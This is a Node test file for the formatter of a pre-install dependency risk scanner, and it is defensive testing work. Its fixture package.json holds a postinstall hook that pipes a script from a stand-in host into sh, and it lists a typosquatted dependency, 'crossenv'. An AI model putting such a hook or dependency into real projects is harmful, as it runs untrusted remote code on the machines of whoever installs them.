import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { assessRepository } from '@dependency-radar/core';
import { formatRiskReport } from '../src/format-risk.ts';

const file = (path: string, content: string) => ({ path, content });
const bad = assessRepository({
  files: [file('package.json', JSON.stringify({ scripts: { postinstall: 'curl -s https://example.test/a.sh | sh', prepare: 'husky' }, dependencies: { crossenv: '1.0.0' } }))],
});
const clean = assessRepository({ files: [file('package.json', '{}')] });
const base = { subject: '/tmp/task', color: false, showAll: false };

describe('formatRiskReport', () => {
  it('leads with the verdict and the counts', () => {
    const output = formatRiskReport(bad, base);
    assert.match(output, /Dependency Radar: pre-install check/);
    assert.match(output, /\/tmp\/task/);
    assert.match(output, /High-risk signals found\nDo not install or run this project on your own computer/);
    assert.match(output, /1 high, 2 medium, 0 low, 1 info/);
  });

  it('lists each signal with place, explanation and excerpt', () => {
    const output = formatRiskReport(bad, base);
    assert.match(output, /HIGH\s+Downloads and runs code in "postinstall"/);
    assert.match(output, /\n {8}package\.json:\d+\n/);
    assert.match(output, /> curl -s https:\/\/example\.test\/a\.sh \| sh/);
    assert.match(output, /MEDIUM\s+"crossenv" looks like the popular package "cross-env"/);
  });

  it('hides informational notes unless asked', () => {
    assert.match(formatRiskReport(bad, base), /1 informational note hidden\. Run with --all/);
    assert.equal(/INFO\s+Runs "prepare"/.test(formatRiskReport(bad, base)), false);
    assert.match(formatRiskReport(bad, { ...base, showAll: true }), /INFO\s+Runs "prepare" automatically/);
  });

  it('never calls a clean result safe and always lists the limits', () => {
    const output = formatRiskReport(clean, base);
    assert.match(output, /No serious signals found\nThat does not mean the project is safe/);
    assert.match(output, /No signals to show\./);
    assert.match(output, /Finding no signals does not mean a repository is safe/);
    assert.equal(/\bsafe to (?:install|run|use)\b/i.test(output), false);
  });

  it('uses colors only when asked', () => {
    assert.equal(formatRiskReport(bad, base).includes('\u001b['), false);
    assert.equal(formatRiskReport(bad, { ...base, color: true }).includes('\u001b[31m'), true);
  });
});
